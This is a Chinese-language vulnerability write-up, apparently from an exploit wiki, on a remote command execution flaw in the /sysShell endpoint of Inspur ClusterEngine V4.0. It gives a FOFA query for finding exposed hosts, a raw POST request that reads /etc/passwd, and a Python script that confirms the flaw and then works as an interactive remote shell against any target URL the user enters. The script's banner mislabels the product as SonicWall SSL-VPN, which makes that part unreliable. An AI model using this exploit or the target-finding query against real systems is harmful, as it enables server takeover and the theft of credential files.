# 浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞

## 漏洞描述

浪潮ClusterEngineV4.0 存在远程命令执行，攻击者通过发送特殊的请求可以获取服务器权限

## 漏洞影响

```
浪潮ClusterEngineV4.0
```

## FOFA

```
title="TSCEV4.0"
```

## 漏洞复现



登录页面如下



![](./images/202202091851299.png)



发送请求包



```plain
POST /sysShell HTTP/1.1
Host: xxx.xxx.xxx.xxx
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: lang=cn
Cache-Control: max-age=0
Content-Length: 42

op=doPlease&node=cu01&command=cat /etc/passwd
```



![](./images/202202091852805.png)



- ✅注意参数 node 中的 cu01 需要为shell集群中的存在主机



![](./images/202202091852553.png)



这里可以配合任意用户登录漏洞查看主机名



## 漏洞POC

如过出现 Name or service not

请通过上述的方法查看 shell集群主机的名称（脚本默认 cu01）



```python
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: SonicWall SSL-VPN                                       \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mCmd         >>> whoami                                            \033[0m')
    print('+------------------------------------------')

def POC_1(target_url, cmd):
    vuln_url = target_url + "/sysShell"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Cookie": "lang=cn"
    }
    data = "op=doPlease&node=cu01&command=cat /etc/passwd"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data,verify=False, timeout=5)
        print("\033[32m[o] 正在请求 {}/sysShell \033[0m".format(target_url))
        if "root" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,成功执行 cat /etc/passwd \033[0m".format(target_url))
            print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))
            while True:
                cmd = input("\033[35mCmd >>> \033[0m")
                if cmd == "exit":
                    sys.exit(0)
                else:
                    POC_2(target_url, cmd)
        else:
            print("\033[31m[x] 请求失败 \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_2(target_url, cmd):
    vuln_url = target_url + "/sysShell"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Cookie": "lang=cn"
    }
    data = "op=doPlease&node=cu01&command={}".format(cmd)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


if __name__ == '__main__':
    title()
    cmd = 'cat /etc/passwd'
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url, cmd)
```



![](./images/202202091852927.png)



## 

